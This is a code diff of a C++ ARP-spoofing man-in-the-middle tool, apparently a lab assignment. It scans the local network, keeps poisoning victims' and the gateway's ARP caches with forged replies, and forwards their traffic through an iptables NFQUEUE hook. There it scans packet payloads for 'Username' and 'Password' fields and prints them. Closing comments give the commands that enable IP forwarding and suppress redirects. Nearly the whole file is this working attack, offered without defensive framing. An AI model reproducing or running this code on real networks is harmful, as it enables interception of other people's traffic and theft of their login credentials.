@@ -1,231 +1,315 @@
 #include <iostream>
-#include <vector>
-#include <sys/socket.h>
-#include <sys/ioctl.h>
-#include <net/if.h>
-#include <netinet/ip.h>
-#include <arpa/inet.h>
-#include <string.h>
+#include <cstring>
+#include <map>
+#include <unordered_map>
+#include <iomanip>
 #include <string>
-#include <unistd.h>
-#include <linux/if_packet.h>
-#include <netinet/if_ether.h>
-#include <linux/if_ether.h>
-#include <pthread.h>
-#include <linux/tcp.h>
 #include <algorithm>
 #include <fstream>
 #include <cstdio>
+#include <vector>
 #include <memory>
 #include <stdexcept>
 #include <array>
-#include <unordered_map>
-#define BUFFER_SIZE ETH_FRAME_LEN
-std::unordered_map<uint32_t, uint8_t*> ip_to_mac;
-char* victim_ip = (char*)malloc(20 * sizeof(char));
-char* gateway_ip = (char*)malloc(20 * sizeof(char));
-uint8_t* self_mac = (uint8_t*)malloc(6 * sizeof(uint8_t));
-uint8_t* victim_mac = (uint8_t*)malloc(6 * sizeof(uint8_t));
-uint8_t* gateway_mac = (uint8_t*)malloc(6 * sizeof(uint8_t));
-char* self_ip = (char*)malloc(20 * sizeof(char));
-std::string ip_str;
-int mask;
-std::string interface;
-std::string execCommand(const char* cmd) {
-    std::array<char, 128> buffer;
-    std::string result;
-    std::shared_ptr<FILE> pipe(popen(cmd, "r"), pclose);
-    if (!pipe) {
-        throw std::runtime_error("popen() failed!");
-    }
+#include <time.h>
+#include <math.h>
+#include <fcntl.h>
+#include <stdlib.h>
+#include <string.h>
+#include <signal.h>
+#include <unistd.h>
+#include <arpa/inet.h>
+#include <sys/time.h>
+#include <sys/wait.h>
+#include <sys/socket.h>
+#include <sys/ioctl.h>
+#include <netinet/in.h>
+#include <netinet/ip.h>
+#include <netinet/if_ether.h>
+#include <net/if.h>
+#include <netdb.h>
+#include <thread>
+#include <pthread.h>
+#include <chrono>
+#include <linux/if_packet.h>
+#include <linux/tcp.h>
+#include <linux/udp.h>
+#include <errno.h>
+#include <linux/types.h>
+#include <linux/netfilter.h>
+#include <libnetfilter_queue/libnetfilter_queue.h>
+
+using namespace std;
+
+struct ownaddr {
+    string ip;
+    string mac;
+};
+
+/* DNS header definition */
+struct dnshdr {
+    u_int16_t id;
+    u_int16_t flags;
+    u_int16_t qdcount;
+    u_int16_t ancount;
+    u_int16_t nscount;
+    u_int16_t arcount;
+};
+
+/* DNS query structure */
+struct dnsquery {
+    u_int16_t qtype;
+    u_int16_t qclass;
+};
+
+/* DNS answer structure */
+struct dnsanswers {
+    u_int16_t start_off;
+    u_int16_t atype;
+    u_int16_t aclass;
+    u_int16_t ttl_one;
+    u_int16_t ttl_two;
+    u_int16_t RdataLen;
+};
+
+unordered_map<string, string> seen_addresses;
+string dev_name = "";
+ownaddr own;
+ownaddr gw;
+
+string execCommand(const char* cmd) {
+    array<char, 128> buffer;
+    string result;
+    shared_ptr<FILE> pipe(popen(cmd, "r"), pclose);
+    if (!pipe) 
+        throw runtime_error("popen() failed!");
+
     while (!feof(pipe.get())) {
-        if (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
+        if (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) 
             result += buffer.data();
-        }
     }
     return result;
 }
-void get_ip_mac_address(char* ip) {
-    int sfd;
-    unsigned char* mac;
-    struct arpreq arp_req;
-    struct sockaddr_in* sin;
 
-    sin = (struct sockaddr_in*)&(arp_req.arp_pa);
-    memset(&arp_req, 0, sizeof(arp_req));
-    sin->sin_family = AF_INET;
-    inet_pton(AF_INET, ip, &(sin->sin_addr));
-    strncpy(arp_req.arp_dev, interface.c_str(), IFNAMSIZ-1);
+string subnet(string ip_add) {
+    string ret = "";
+    int dot = 0;
+    for(int i = 0; i < int(ip_add.size()) && dot < 3; i++){
+        if(ip_add[i] == '.') dot++;
+        ret += ip_add[i];
+    }
+    return ret;
+}
 
-    if ((sfd = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
-        perror("socket");
-        exit(-1);
-    }
-    if (ioctl(sfd, SIOCGARP, &arp_req) < 0)
-        return;
-    if (arp_req.arp_flags & ATF_COM) {
-        mac = (unsigned char*) arp_req.arp_ha.sa_data;
-        if (strcmp(ip, gateway_ip) != 0) {
-            struct in_addr addr;
-            inet_aton(ip, &addr);
-            ip_to_mac[addr.s_addr] = (uint8_t*)malloc(6 * sizeof(uint8_t));
-            memcpy(ip_to_mac[addr.s_addr], mac, 6 * sizeof(uint8_t));
-        }
-        if (strcmp(ip, gateway_ip) == 0) 
-            memcpy(gateway_mac, mac, 6 * sizeof(uint8_t));
-        else {
-            printf("%s", ip);
-            for (unsigned long int i = 0; i < 20 - strlen(ip); ++i)
-                printf(" ");
-            printf("%02x:%02x:%02x:%02x:%02x:%02x\n",
-                mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);   
-        }
-    }
-    close(sfd);
-}
-void send_ICMP() {
-    std::string command = "ip addr show " + std::string(interface);
-    std::string buffer = execCommand(command.c_str());
-    int ip_start = buffer.find("inet ") + 5;
-    int ip_end = buffer.find("/", ip_start);
-    int mask_end = buffer.find(" ", ip_end);
-    ip_str = buffer.substr(ip_start, ip_end - ip_start);
-    std::string mask_str = buffer.substr(ip_end + 1, mask_end - (ip_end + 1));
-    struct in_addr addr;
-    inet_aton(ip_str.c_str(), &addr);
-    mask = atoi(mask_str.c_str());
-    addr.s_addr = (addr.s_addr << (32 - mask)) >> (32 - mask);
-    std::string current_ip(inet_ntoa(addr));
-    int n = 1 << (32 - mask);
-    for (int i = 0; i < n; ++i) {
-        command = "ping -c 1 -i 0.01 " + current_ip + " > /dev/null 2>&1 &";
-        system(command.c_str());
-        addr.s_addr = htonl(addr.s_addr);
-        addr.s_addr++;
-        addr.s_addr = ntohl(addr.s_addr);
-        current_ip = std::string(inet_ntoa(addr));
-    }
-}
-void print_ip_mac_address() {
-    send_ICMP();
-    sleep(1);
-    printf("Available devices\n");
-    printf("-------------------------------------\n");
-    printf("IP                  MAC              \n");
-    printf("-------------------------------------\n");
-    struct in_addr addr;
-    inet_aton(ip_str.c_str(), &addr);
-    addr.s_addr = (addr.s_addr << (32 - mask)) >> (32 - mask);
-    int n = 1 << (32 - mask);
-    for (int i = 0; i < n; ++i) {
-        addr.s_addr = htonl(addr.s_addr);
-        addr.s_addr++;
-        addr.s_addr = ntohl(addr.s_addr);
-        get_ip_mac_address(inet_ntoa(addr));
-    }
-}
-static void* spoof_ip_address(void* arg) {
-    int s;
-    struct sockaddr_ll addr1;
-    struct sockaddr_ll addr2;
-    addr1.sll_family = AF_PACKET;
-    addr1.sll_protocol = htons(ETH_P_ARP);
-    addr1.sll_ifindex = if_nametoindex(interface.c_str());
-    addr1.sll_hatype = ARPHRD_ETHER;
-    addr1.sll_pkttype = PACKET_OTHERHOST;
-    addr1.sll_halen = ETH_ALEN;
-    addr2 = addr1;
-    if ((s = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP))) < 0) {
-        perror("socket");
-        exit(-1);
-    }
-    struct arphdr* arp_hdr = (struct arphdr*)malloc(sizeof(struct arphdr));
-    struct ether_arp* arp_gateway = (struct ether_arp*)malloc(sizeof(struct ether_arp));
-    struct ether_arp* arp_victim = (struct ether_arp*)malloc(sizeof(struct ether_arp));
-    arp_hdr -> ar_hrd = htons(ARPHRD_ETHER);
-    arp_hdr -> ar_pro = htons(ETH_P_IP);
-    arp_hdr -> ar_hln = 6;
-    arp_hdr -> ar_pln = 4;
-    arp_hdr -> ar_op  = htons(ARPOP_REPLY);
-    memcpy(arp_gateway, arp_hdr, sizeof(struct arphdr));
-    memcpy(arp_gateway -> arp_sha, self_mac, 6 * sizeof(uint8_t));
-    struct in_addr in;
-    in.s_addr = inet_addr(gateway_ip);
-    memcpy(arp_gateway -> arp_tpa, &in, sizeof(in_addr_t));
-    memcpy(arp_gateway -> arp_tha, gateway_mac, 6 * sizeof(uint8_t));
-    // send to gateway
-    addr2.sll_addr[7] = 0x00;
-    addr2.sll_addr[6] = 0x00;
-    memcpy(&(addr2.sll_addr), arp_gateway -> arp_tha, 6 * sizeof(unsigned char));
-    char buffer2[BUFFER_SIZE];
-    memset(buffer2, 0, BUFFER_SIZE);
-    struct ethhdr* eth_hdr2 = (struct ethhdr*)buffer2;
-    memcpy(eth_hdr2 -> h_dest, arp_gateway -> arp_tha, 6 * sizeof(uint8_t));
-    memcpy(eth_hdr2 -> h_source, self_mac, 6 * sizeof(uint8_t));
-    eth_hdr2 -> h_proto = htons(ETH_P_ARP);
-    char buffer1[BUFFER_SIZE];
-    while (1) {
-        for (std::unordered_map<uint32_t, uint8_t*>::iterator it = ip_to_mac.begin(); it != ip_to_mac.end(); ++it) {
-            in.s_addr = it -> first;
-            memcpy(arp_gateway -> arp_spa, &in, 4 * sizeof(char));
-            memcpy(buffer2 + sizeof(struct ethhdr), arp_gateway, sizeof(struct ether_arp));
-            if ((sendto(s, buffer2, sizeof(struct ethhdr) + sizeof(struct ether_arp), 0, (struct sockaddr*)&addr2, sizeof(struct sockaddr_ll))) < 0) {
-                perror("send");
-                exit(-1);
+void get_defaultgw() {
+    FILE *f;
+    char line[100] , *p , *c, *g, *saveptr;
+    f = fopen("/proc/net/route", "r");
+
+    while(fgets(line , 100 , f)) {
+        p = strtok_r(line, " \t", &saveptr);
+        c = strtok_r(NULL, " \t", &saveptr);
+        g = strtok_r(NULL, " \t", &saveptr);
+
+        if(p != NULL && c != NULL) {
+            if(strcmp(c, "00000000") == 0) {
+                if(g) {
+                    char *pEnd;
+                    int ng = strtol(g, &pEnd,16);
+                    struct in_addr addr;
+                    addr.s_addr = ng;
+                    gw.ip = string(inet_ntoa(addr));
+                    dev_name = string(p);
+                }
+                break;
             }
         }
-        for (std::unordered_map<uint32_t, uint8_t*>::iterator it = ip_to_mac.begin(); it != ip_to_mac.end(); ++it) {
-            struct in_addr tmp;
-            tmp.s_addr = it->first;
-            victim_ip = inet_ntoa(tmp);
-            victim_mac = it->second;
-            struct sockaddr_ll victim_addr;
-            victim_addr.sll_family = AF_PACKET;
-            victim_addr.sll_protocol = htons(ETH_P_ARP);
-            victim_addr.sll_ifindex = if_nametoindex(interface.c_str());
-            victim_addr.sll_hatype = ARPHRD_ETHER;
-            victim_addr.sll_pkttype = PACKET_OTHERHOST;
-            victim_addr.sll_halen = ETH_ALEN;
-            memcpy(arp_victim, arp_hdr, sizeof(struct arphdr));
-            memcpy(arp_victim -> arp_sha, self_mac, 6 * sizeof(uint8_t));
-            struct in_addr in;
-            in.s_addr = inet_addr(gateway_ip);
-            memcpy(arp_victim -> arp_spa, &in, 4 * sizeof(char));
-            memcpy(arp_victim -> arp_tha, victim_mac, 6 * sizeof(uint8_t));
-            in.s_addr = inet_addr(victim_ip);
-            memcpy(arp_victim -> arp_tpa, &in, sizeof(in_addr_t));
-            victim_addr.sll_addr[7] = 0x00;
-            victim_addr.sll_addr[6] = 0x00;
-            memcpy(&(victim_addr.sll_addr), arp_victim -> arp_tha, 6 * sizeof(uint8_t));
-            memset(buffer1, 0, BUFFER_SIZE);
-            struct ethhdr* eth_hdr1 = (struct ethhdr*)buffer1;
-            memcpy(eth_hdr1 -> h_dest, arp_victim -> arp_tha, 6 * sizeof(uint8_t));
-            memcpy(eth_hdr1 -> h_source, self_mac, 6 * sizeof(uint8_t));
-            eth_hdr1 -> h_proto = htons(ETH_P_ARP);
-            memcpy(buffer1 + sizeof(struct ethhdr), arp_victim, sizeof(struct ether_arp));
-            if ((sendto(s, buffer1, sizeof(struct ethhdr) + sizeof(struct ether_arp), 0, (struct sockaddr*)&victim_addr, sizeof(struct sockaddr_ll))) < 0) {
-                perror("send");
-                exit(-1);
-            }
-        }
-        sleep(1);
     }
+    fclose(f);
+    return;
 }
-void get_mac_address() {
-    struct ifreq s;
-    int fd = socket(PF_INET, SOCK_STREAM, IPPROTO_IP);
 
-    strcpy(s.ifr_name, interface.c_str());
-    if (0 == ioctl(fd, SIOCGIFHWADDR, &s)) {
-        for (int i = 0; i < 6; ++i) {
-            self_mac[i] = (unsigned char) s.ifr_addr.sa_data[i];
-        }
-    }
-    if (0 == ioctl(fd, SIOCGIFADDR, &s)) {
-        self_ip = (char*)inet_ntoa(((struct sockaddr_in*)&s.ifr_addr) -> sin_addr);
-    }
+void get_interface_info() {
+    int fd = socket(AF_INET, SOCK_DGRAM, 0);
+    if (fd == -1) return;
+
+    struct ifreq ifr;
+    strncpy(ifr.ifr_name, dev_name.c_str(), IFNAMSIZ);
+
+    ioctl(fd, SIOCGIFADDR, &ifr);
+    struct sockaddr_in* addr = (struct sockaddr_in*)&ifr.ifr_addr;
+    own.ip = inet_ntoa(addr->sin_addr);
+
+    ioctl(fd, SIOCGIFHWADDR, &ifr);
+    char mac_address_str[18];
+    sprintf(mac_address_str, "%02x:%02x:%02x:%02x:%02x:%02x", (unsigned char) ifr.ifr_hwaddr.sa_data[0], (unsigned char) ifr.ifr_hwaddr.sa_data[1], (unsigned char) ifr.ifr_hwaddr.sa_data[2], (unsigned char) ifr.ifr_hwaddr.sa_data[3], (unsigned char) ifr.ifr_hwaddr.sa_data[4], (unsigned char) ifr.ifr_hwaddr.sa_data[5]);
+    own.mac = string(mac_address_str);
+
     close(fd);
+    return;
 }
+
+void read_arp_table() {
+    FILE* arp_file = fopen("/proc/net/arp", "r");
+
+    char line[256];
+    fgets(line, sizeof(line), arp_file);
+
+    while (fgets(line, sizeof(line), arp_file)) {
+        char ip_str[16], hw_type[6], flags[6], mac_str[18], mask_str[6], device[500];
+        int n = sscanf(line, "%s 0x%s 0x%s %17s %s %s", ip_str, hw_type, flags, mac_str, mask_str, device);
+        if (n == 6) {
+            string ip_address(ip_str);
+            string mac_address(mac_str);
+
+            if(ip_address == gw.ip) 
+                gw.mac = mac_address;
+            if (ip_address != own.ip && ip_address != gw.ip && subnet(ip_address) == subnet(own.ip)) 
+                seen_addresses[ip_address] = mac_address;
+        }
+    }
+
+    fclose(arp_file);
+}
+
+void task1() {
+    get_defaultgw();
+    get_interface_info();
+    read_arp_table();
+
+    cout << "Available devices\n------------------------------------\nIP                 MAC\n";
+    cout << "------------------------------------\n";
+    for (auto it = seen_addresses.begin(); it != seen_addresses.end(); it++){
+        if(it->second != "00:00:00:00:00:00")
+            cout << left << setw(15) << it->first << "    " << it->second << '\n';
+    }
+}
+
+void send_arp_reply(const char* src_ip, const char* src_mac, const char* dest_ip, const char* dest_mac, const char* interface) {
+    int raw_socket = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
+    if (raw_socket < 0) {
+        perror("Socket creation failed");
+        return;
+    }
+
+    uint32_t src_ip_binary = inet_addr(src_ip);
+    uint32_t dst_ip_binary = inet_addr(dest_ip);
+    unsigned int srcmac[6], dstmac[6];
+    sscanf(src_mac,  "%x:%x:%x:%x:%x:%x", &srcmac[0], &srcmac[1], &srcmac[2], &srcmac[3], &srcmac[4], &srcmac[5]);
+    sscanf(dest_mac, "%x:%x:%x:%x:%x:%x", &dstmac[0], &dstmac[1], &dstmac[2], &dstmac[3], &dstmac[4], &dstmac[5]);
+
+    struct sockaddr_ll sa;
+    memset(&sa, 0, sizeof(struct sockaddr_ll));
+
+    struct ifreq ifr;
+    memset(&ifr, 0, sizeof(struct ifreq));
+    strncpy(ifr.ifr_name, interface, IFNAMSIZ - 1);
+
+    if (ioctl(raw_socket, SIOCGIFINDEX, &ifr) == -1) {
+        perror("Failed to get interface index");
+        close(raw_socket);
+        return;
+    }
+
+    sa.sll_family   = AF_PACKET;
+    sa.sll_protocol = htons(ETH_P_ARP);
+    sa.sll_ifindex  = ifr.ifr_ifindex;
+    sa.sll_addr[6] = 0;
+    sa.sll_addr[7] = 0;
+    for(int i = 0; i < 6; i++)
+        sa.sll_addr[i] = dstmac[i];
+
+    unsigned char packet[42];
+    memset(packet, '\0', sizeof(packet));
+
+    for(int i = 0; i < 6; i++) packet[i]     = dstmac[i];
+    for(int i = 0; i < 6; i++) packet[6 + i] = srcmac[i];
+    memcpy(packet + 12, &sa.sll_protocol, 2); // Protocol
+
+    // ARP header
+    packet[14] = 0x00; // Hardware type: Ethernet
+    packet[15] = 0x01;
+    packet[16] = 0x08; // Protocol type: IPv4
+    packet[17] = 0x00;
+    packet[18] = 0x06; // Hardware size: 6 bytes
+    packet[19] = 0x04; // Protocol size: 4 bytes
+    packet[20] = 0x00; // Opcode: ARP reply
+    packet[21] = 0x02;
+
+    for(int i = 0; i < 6; i++) packet[32 + i] = dstmac[i];
+    for(int i = 0; i < 6; i++) packet[22 + i] = srcmac[i];
+
+    memcpy(packet + 28, &src_ip_binary, 4);
+    memcpy(packet + 38, &dst_ip_binary, 4);
+
+    if (sendto(raw_socket, packet, sizeof(packet), 0, (struct sockaddr*)&sa, sizeof(struct sockaddr_ll)) == -1) {
+        perror("Failed to send ARP reply");
+    }
+
+    close(raw_socket);
+}
+
+void* task2(void* arg){
+    while(true){
+        for (auto it = seen_addresses.begin(); it != seen_addresses.end(); it++){
+            send_arp_reply(gw.ip.c_str(), own.mac.c_str(), it->first.c_str(), it->second.c_str(), dev_name.c_str());
+            send_arp_reply(it->first.c_str(), own.mac.c_str(), gw.ip.c_str(), gw.mac.c_str(),  dev_name.c_str());
+        }
+        sleep(3);
+    }
+}
+
+u_int16_t computeIPChecksum(struct iphdr* iphdr) {
+    unsigned long sum = 0;
+    u_int16_t* ptr = (u_int16_t*)iphdr;
+    int hdr_len = iphdr->ihl * 4;
+
+    while (hdr_len > 1) {
+        sum += *ptr++;
+        hdr_len -= 2;
+    }
+
+    if (hdr_len == 1) {
+        sum += *((u_int8_t*)ptr);
+    }
+
+    sum = (sum >> 16) + (sum & 0xFFFF);
+    sum += (sum >> 16);
+
+    return (u_int16_t)(~sum);
+}
+
+uint16_t calculate_udp_checksum(const uint8_t *buf, size_t len, uint32_t src_ip, uint32_t dest_ip) {
+    uint32_t sum = 0;
+    
+    // Pseudo-header
+    sum += (src_ip >> 16) & 0xFFFF; // Source IP High 16 bits
+    sum += src_ip & 0xFFFF;          // Source IP Low 16 bits
+    sum += (dest_ip >> 16) & 0xFFFF; // Destination IP High 16 bits
+    sum += dest_ip & 0xFFFF;         // Destination IP Low 16 bits
+    sum += htons(IPPROTO_UDP);       // Protocol
+    sum += htons(len);               // UDP Length
+    
+    // UDP header and payload
+    const uint16_t *buf16 = reinterpret_cast<const uint16_t *>(buf);
+    while (len > 1) {
+        sum += *buf16++;
+        len -= 2;
+    }
+    // If there's a single byte left over, add it to the sum (padding)
+    if (len) {
+        sum += *reinterpret_cast<const uint8_t *>(buf16);
+    }
+    
+    // Fold 32-bit sum to 16 bits
+    while (sum >> 16) {
+        sum = (sum & 0xFFFF) + (sum >> 16);
+    }
+    
+    // Take one's complement of the sum
+    return ~sum;
+}
+
 void parse_TCP(char* buffer) {
     struct tcphdr* tcphdr = (struct tcphdr*)buffer;
     std::string payload(buffer + 4 * tcphdr->doff);
@@ -238,91 +322,145 @@ void parse_TCP(char* buffer) {
     std::cout << "Username: " << payload.substr(uname + 12, upwd - 1 - (uname + 12)) << '\n';
     std::cout << "Password: " << payload.substr(upwd + 12, upwd_end - (upwd + 12)) << '\n';
 }
-static void* packet_forward(void* args) {
-    int s = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
-    int buffer_size = 65535;
-    setsockopt(s, SOL_SOCKET, SO_RCVBUF, (const char*)&buffer_size, sizeof(int));
-    if (s < 0) {
-        perror("forward socket");
-        exit(-1);
+
+static int cb(struct nfq_q_handle *qh, struct nfgenmsg *nfmsg, struct nfq_data *nfa, void *buf) {
+    struct nfqnl_msg_packet_hdr *ph;
+    struct nfqnl_msg_packet_hw  *hwph;
+    u_int32_t id = 0, plen = 0;
+    unsigned char *data;
+
+    ph = nfq_get_msg_packet_hdr(nfa);
+    if (ph) {
+        id = ntohl(ph->packet_id);
+        // printf("hw_protocol=0x%04x hook=%u id=%u ", ntohs(ph->hw_protocol), ph->hook, id);
     }
-    char buffer[BUFFER_SIZE];
-    struct sockaddr_ll sa;
-    sa.sll_family = AF_PACKET;
-    sa.sll_protocol = htons(ETH_P_ALL);
-    sa.sll_ifindex = if_nametoindex(interface.c_str());
-    sa.sll_hatype = ARPHRD_ETHER;
-    sa.sll_pkttype = PACKET_OTHERHOST;
-    sa.sll_halen = ETH_ALEN;
-    sa.sll_addr[7] = 0;
-    sa.sll_addr[6] = 0;
-    while (1) {
-        memset(buffer, 0, sizeof(buffer));
-        int read_bytes = recvfrom(s, buffer, sizeof(buffer), 0, NULL, NULL);
-        if (read_bytes == 0)
-            continue;
-        struct ethhdr* ethhdr = (struct ethhdr*)buffer;
-        if (memcmp(ethhdr->h_dest, self_mac, sizeof(ETH_ALEN)) != 0)
-            continue;
-        struct iphdr* iphdr = (struct iphdr*)(buffer + sizeof(ether_header));
-        in_addr saddr, daddr;
-        saddr.s_addr = iphdr->saddr;
-        daddr.s_addr = iphdr->daddr;
-        bool source_is_victims = ip_to_mac.count(saddr.s_addr);
-        bool dest_is_victims = ip_to_mac.count(daddr.s_addr);
-        bool dest_is_self = (strncmp(inet_ntoa(daddr), self_ip, strlen(self_ip)) == 0 && strlen(self_ip) == strlen(inet_ntoa(daddr)));
-        if (source_is_victims && !dest_is_self) {
-            memcpy(&(sa.sll_addr), gateway_mac, ETH_ALEN * sizeof(uint8_t));
-            memcpy(ethhdr->h_dest, gateway_mac, ETH_ALEN * sizeof(uint8_t));
-            memcpy(ethhdr->h_source, self_mac, ETH_ALEN * sizeof(uint8_t));
-            victim_mac = ip_to_mac[saddr.s_addr];
-            if (iphdr->protocol == IPPROTO_TCP) {
-                parse_TCP(buffer + sizeof(ether_header) + 4 * iphdr->ihl);
-            }
+
+    plen = nfq_get_payload(nfa, &data);
+    // if (plen >= 0) printf("payload_len=%d\n", plen);
+
+    // for (int i = 0; i < plen; i++) {
+    //     printf("%0X ", data[i]);
+    //     if ((i + 1) % 16 == 0) cout << endl;
+    // }
+    struct iphdr*  iphdr   = (struct iphdr*)(data);
+    // TCP : 6, UDP : 17
+    // cout << "Protocol: " << int(iphdr->protocol) << '\n';
+    if(int(iphdr->protocol) != 6)
+        return nfq_set_verdict(qh, id, NF_ACCEPT, 0, NULL);
+
+
+    char iparr[INET_ADDRSTRLEN];
+    struct in_addr ip_str;
+    ip_str.s_addr = iphdr->saddr;
+    inet_ntop(AF_INET, &ip_str, iparr, INET_ADDRSTRLEN);
+    string srcipaddr = string(iparr);
+
+    if(!seen_addresses.count(srcipaddr))
+        return nfq_set_verdict(qh, id, NF_ACCEPT, 0, NULL);
+
+    struct tcphdr* tcp_hdr = (struct tcphdr*)(data + iphdr->ihl*4);
+    u_int16_t srcport = ntohs(tcp_hdr->source);
+    // cout << "IP Header:" << endl;
+    // cout << "  Source IP     : " << inet_ntoa(*(struct in_addr*)&(iphdr->saddr)) << endl;
+    // cout << "  Destination IP: " << inet_ntoa(*(struct in_addr*)&(iphdr->daddr)) << endl;
+
+    // cout << "TCP Header:" << endl;
+    // cout << "  Source Port: " << ntohs(tcp_hdr->source) << endl;
+    // cout << "  Dest Port  : " << ntohs(tcp_hdr->dest) << endl;
+    int start = iphdr->ihl * 4 + tcp_hdr->doff * 4;
+    for(int i = start; i < plen; i++){
+        // if((int)(data[i]) >= 33 && (int)(data[i]) <= 125)
+        //     cout << i << " : " <<data[i] << '\n';
+        if(data[i] == 'U' && data[i + 1] == 's' && data[i + 2] == 'e' && data[i + 3] == 'r' && data[i + 4] == 'n' && data[i + 5] == 'a' && data[i + 6] == 'm' && data[i + 7] == 'e'){
+            cout << "\nUsername: ";
+            for(int j = i + 9; data[j] != '&'; j++)
+                cout << data[j];
+            cout << '\n';
         }
-        else if (dest_is_victims) {
-            victim_mac = ip_to_mac[daddr.s_addr];
-            memcpy(&(sa.sll_addr), victim_mac, ETH_ALEN * sizeof(uint8_t));
-            memcpy(ethhdr->h_dest, victim_mac, ETH_ALEN * sizeof(uint8_t));
-            memcpy(ethhdr->h_source, self_mac, ETH_ALEN * sizeof(uint8_t));
-        }
-        else 
-            continue;
-        // printf("sendto bytes: %d\n", read_bytes);
-        if ((sendto(s, buffer, read_bytes, 0, (struct sockaddr*)&sa, sizeof(struct sockaddr_ll))) < 0) {
-            perror("send");
-            exit(-1);
+        else if(data[i] == 'P' && data[i + 1] == 'a' && data[i + 2] == 's' && data[i + 3] == 's' && data[i + 4] == 'w' && data[i + 5] == 'o' && data[i + 6] == 'r' && data[i + 7] == 'd'){
+            cout << "Password: ";
+            for(int j = i + 9; data[j] != '&' && j < plen; j++)
+                cout << data[j];
+            cout << '\n';
         }
     }
+
+    return nfq_set_verdict(qh, id, NF_ACCEPT, 0, NULL);
 }
+
+static void* nfque(void* args) {
+    string clean_iptable = execCommand("iptables --flush");
+    string set_iptable1  = execCommand("iptables -A FORWARD -j NFQUEUE --queue-num 0");
+
+    struct nfq_handle *h = nfq_open();
+    if (!h) {
+        fprintf(stderr, "error during nfq_open()\n");
+        exit(1);
+    }
+
+    if (nfq_unbind_pf(h, AF_INET) < 0) {
+        fprintf(stderr, "error during nfq_unbind_pf()\n");
+        exit(1);
+    }
+
+    if (nfq_bind_pf(h, AF_INET) < 0) {
+        fprintf(stderr, "error during nfq_bind_pf()\n");
+        exit(1);
+    }
+
+    struct nfq_q_handle *qh = nfq_create_queue(h,  0, &cb, NULL);
+    if (!qh) {
+        fprintf(stderr, "error during nfq_create_queue()\n");
+        exit(1);
+    }
+
+    if (nfq_set_mode(qh, NFQNL_COPY_PACKET, 0xffff) < 0) {
+        fprintf(stderr, "can't set packet_copy mode\n");
+        exit(1);
+    }
+
+    int fd = nfq_fd(h), rv;
+
+    char buf[4096];
+    while (1) {
+        if ((rv = recv(fd, buf, sizeof(buf), 0)) >= 0) {
+            nfq_handle_packet(h, buf, rv);
+            continue;
+        }
+        else if (rv < 0 && errno == ENOBUFS) {
+            printf("losing packets!\n");
+            continue;
+        }
+        perror("recv failed");
+        break;
+    }
+
+    nfq_destroy_queue(qh);
+    nfq_close(h);
+
+    return NULL;
+}
+
 int main() {
-    interface = execCommand("ip -o -4 route show to default | awk '{print $5}'");
-    interface = interface.substr(0, interface.length() - 1);
-    std::string gateway_ip_str = execCommand("ip -o -4 route show to default | awk '{print $3}'").c_str();
-    gateway_ip = (char*)gateway_ip_str.substr(0, gateway_ip_str.length() - 1).c_str();
-    system("sudo apt install ethtool >/dev/null 2>&1");
-    system("sudo ethtool -K ens33 gro off >/dev/null 2>&1");
-    print_ip_mac_address();
-    get_mac_address();
-    pthread_t thread_for_spoof;
-    pthread_t thread_for_forward;
+    task1();
+    pthread_t t1;
+    pthread_t t2;
     void* args = NULL;
-    if (pthread_create(&thread_for_spoof, NULL, spoof_ip_address, args) != 0) {
+    if (pthread_create(&t1, NULL, task2, args) != 0) {
         perror("pthread_create");
         exit(-1);
     }
-    if (pthread_create(&thread_for_forward, NULL, packet_forward, args) != 0) {
+    if (pthread_create(&t2, NULL, nfque, args) != 0) {
         perror("pthread_create");
         exit(-1);
     }
-    if (pthread_join(thread_for_spoof, NULL) != 0) {
-        perror("pthread_join");
-        exit(-1);
-    }
-    if (pthread_join(thread_for_forward, NULL) != 0) {
-        perror("pthread_join");
-        exit(-1);
-    }
+
+    pthread_join(t1, NULL);
+    pthread_join(t2, NULL);
+    
     return 0;
 }
-// sudo ethtool -K ens33 gro off
+
+// echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
+// echo 0 | sudo tee /proc/sys/net/ipv4/conf/*/send_redirects
+// -lnetfilter_queue
